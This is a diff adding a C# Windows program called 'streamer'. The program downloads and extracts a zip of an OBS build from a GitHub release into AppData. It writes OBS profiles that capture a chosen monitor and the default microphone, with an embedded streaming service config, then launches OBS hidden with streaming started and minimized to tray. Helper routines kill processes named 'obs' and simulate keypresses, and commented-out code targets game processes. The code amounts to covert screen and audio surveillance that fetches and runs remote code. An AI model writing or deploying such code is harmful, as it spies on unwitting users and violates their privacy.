@@ -1,0 +1,168 @@
+using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Management;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace streamer
+{
+    internal static class Program
+    {
+       
+        static void check_create(string path)
+        {
+            if (!System.IO.Directory.Exists(path))
+                System.IO.Directory.CreateDirectory(path);
+        }
+
+        static void start()
+        {
+            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\obs-studio\\obs\\xar\\bin\\64bit";
+           // var path = "C:\\Program Files\\obs-studio\\bin\\64bit";
+            ProcessStartInfo _processStartInfo = new ProcessStartInfo();
+            _processStartInfo.WorkingDirectory = path;
+            _processStartInfo.FileName = @"obs64.exe";
+            _processStartInfo.Arguments = "--startstreaming --minimize-to-tray";
+            _processStartInfo.CreateNoWindow = true;
+            _processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process myProcess = Process.Start(_processStartInfo);
+        }
+        static void close()
+        {
+            Process[] runingProcess = Process.GetProcesses();
+            for (int i = 0; i < runingProcess.Length; i++)
+            {
+                if (runingProcess[i].ProcessName.Contains("obs"))
+                {
+                    runingProcess[i].Kill();
+                }
+            }
+        }
+        static void change(int w, int h, int monitor)
+        {
+            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\obs-studio";
+
+            check_create(path);
+            check_create(path + "\\basic");
+            check_create(path + "\\basic\\profiles");
+            check_create(path + "\\basic\\profiles\\Untitled");
+            check_create(path + "\\basic\\scenes");
+
+            System.IO.File.WriteAllText(path + "\\global.ini", streamer.Properties.Resources.global);
+
+            var txt2 = streamer.Properties.Resources.basic;
+
+            txt2 = txt2.Replace("BASEW", w.ToString());
+            txt2 = txt2.Replace("BASEH", h.ToString());
+
+
+            System.IO.File.WriteAllText(path + "\\basic\\profiles\\Untitled\\basic.ini", txt2);
+            System.IO.File.WriteAllBytes(path + "\\basic\\profiles\\Untitled\\service.json", streamer.Properties.Resources.service);
+
+
+            var txt = System.Text.Encoding.UTF8.GetString(streamer.Properties.Resources.monitor_2);
+            txt = txt.Replace("MONITORNUMBER", monitor.ToString());
+
+            RegistryKey MyReg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\MMDevices\\Audio\\Capture");
+            var subKeys = MyReg.GetSubKeyNames();
+            // txt = txt.Replace("KAKAPIPI", subKeys[0]);
+            txt = txt.Replace("{0.0.1.00000000}.KAKAPIPI", "default");
+            System.IO.File.WriteAllText(path + "\\basic\\scenes\\Untitled.json", txt);
+        }
+        static void install()
+        {
+            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\obs-studio";
+
+            change(1920, 1080, 0);
+
+            using (var client = new WebClient())
+            {
+                client.DownloadFile("https://github.com/s3cretclub/sec1337/releases/download/1/xar.zip", path + "\\" + "xar.zip");
+            }
+
+            // byte[] response = new System.Net.WebClient().DownloadData("https://github.com/s3cretclub/sec1337/releases/download/1/xar.zip");
+            //System.IO.File.WriteAllBytes(path + "\\" + "xar.zip", response);
+
+            System.IO.Compression.ZipFile.ExtractToDirectory(path + "\\" + "xar.zip", path + "\\" + "obs");
+        }
+
+
+        [DllImport("ntdll.dll", PreserveSig = false)]
+        public static extern void NtSuspendProcess(IntPtr processHandle);
+        static IntPtr handle;
+
+        [DllImport("user32.dll")]
+        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
+
+
+        static void simKkey()
+        {
+
+            var ke = (byte)Keys.Space;
+
+            for(int i = 0; i < 50; i++)
+            {
+            keybd_event((byte)ke, 0, 0x0000, 0);
+            System.Threading.Thread.Sleep(50);
+            keybd_event((byte)ke, 0, 0x0002, 0);
+
+                System.Threading.Thread.Sleep(200);
+            }
+
+           // System.Threading.Thread.Sleep(200);
+
+        }
+
+        public static void SearchSubKeys(RegistryKey root, String searchKey)
+        {
+
+            foreach (string keyname in root.GetSubKeyNames())
+            {
+                try
+                {
+                    using (RegistryKey key = root.OpenSubKey(keyname))
+                    {
+                        if (keyname == searchKey)
+                            MessageBox.Show(key.Name);
+
+                       // SearchSubKeys(key, searchKey);
+                    }
+                }
+                catch (System.Security.SecurityException)
+                {
+                }
+            }
+        }
+
+        [STAThread]
+        static void Main()
+        {
+
+            //  Process.Start("kekma.net"); 
+            //simKkey();
+
+
+            // Clipboard.SetText("pornhub.com");
+            //Process[] runingProcess = Process.GetProcesses();
+            //for (int i = 0; i < runingProcess.Length; i++)
+            //{
+            //    if (runingProcess[i].ProcessName.Contains("Counter") || runingProcess[i].ProcessName.ToLower().Contains("CS:"))
+            //    {
+            //        runingProcess[i].Kill();
+            //    }
+            //}
+
+             //close();
+           // install();        
+            ////2560x1440
+           // change(2560, 1440, 2);
+            // System.Threading.Thread.Sleep(200);
+             start();
+        }
+    }
+}
